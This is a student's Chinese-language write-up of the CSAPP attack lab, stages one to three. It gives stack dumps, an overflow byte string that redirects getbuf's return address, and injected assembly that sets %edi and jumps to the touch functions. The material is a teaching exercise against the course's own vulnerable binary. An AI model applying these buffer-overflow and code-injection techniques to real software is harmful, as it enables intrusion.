# CSAPP-LAB2
``attack``
通过objdump -d进行反汇编代码，通过gdb进行调试
## stage1
本题通过getbuf读取字符到栈上，从而修改返回地址
调用getbuf之前的栈为，00401976即是返回地址
```
0x5561dc78:	0x00000000	0x00000000	0x00000000	0x00000000
0x5561dc88:	0x00000000	0x00000000	0x00000000	0x00000000
0x5561dc98:	0x55586000	0x00000000	0x00401976	0x00000000
0x5561dca8:	0x00000002	0x00000000	0x00401f24	0x00000000
0x5561dcb8:	0x00000000	0x00000000	0xf4f4f4f4	0xf4f4f4f4
```
我们通过输入字符串，将栈刷掉，使得返回地址为 004017c0，即为touch1的入口地址
```
00 00 00 00 
00 00 00 00 
00 00 00 00 
00 00 00 00 
00 00 00 00 
00 00 00 00 
00 00 00 00 
00 00 00 00 
00 00 00 00 
00 00 00 00 
c0 17 40 00
```
getbuf返回之后的栈为
```
0x5561dc78:	0xf0c1c748	0x13004011	0x00000000	0x00000000
0x5561dc88:	0x00000000	0x00000000	0x00000000	0x00000000
0x5561dc98:	0x00000000	0x00000000	0x004017c0	0x00000000
0x5561dca8:	0x00000002	0x00000000	0x00401f24	0x00000000
0x5561dcb8:	0x00000000	0x00000000	0xf4f4f4f4	0xf4f4f4f4
```

## stage2
这一题较上一题的不同是 在跳转到touch2之前需要将edi的值修改成cookie的值
如何做困扰我很久，后来参考了csdn的解答才有了思路，我们可以通过修改栈的值来使得返回时跳到另一个位置，通过这个机制，我们能跳到插入代码的位置，插入代码保存在哪里，当然最为保险的还是保存在栈上，另一个问题是如何修改edi之后继续跳转，解决方法还是类似，在栈上插入一条目标地址，然后使用ret即可，这两个操作也是包括在插入的代码中。
下面列出插入的代码
```
movl    $0x59b997fa,%edi
pushq   $0x4017ec  ## touch2函数的入口地址
ret
```
最初栈的返回地址需要是插入代码的起始地址

## stage3
这一题在上一题的基础上，加入了赋值字符串，我们需要将字符串保存到一个位置，然后将其赋值给edi，
字符串保存的位置是本题的关键，在这个上面我卡了一个多小时，一个核心就是在进行push和ret的时候$rsp会覆盖栈上原来的内容，因此我们需要将字符串保存到一个不会被覆盖的地方
经过测试0x5561dca8之前大约100多个字节都是不可靠的地址，它们都会被覆盖掉，因此我们最终将字符串保存到0x5561dcb0这个位置
```
movl    $0x5561dcb0,%edi
pushq   $0x4018fa
ret
```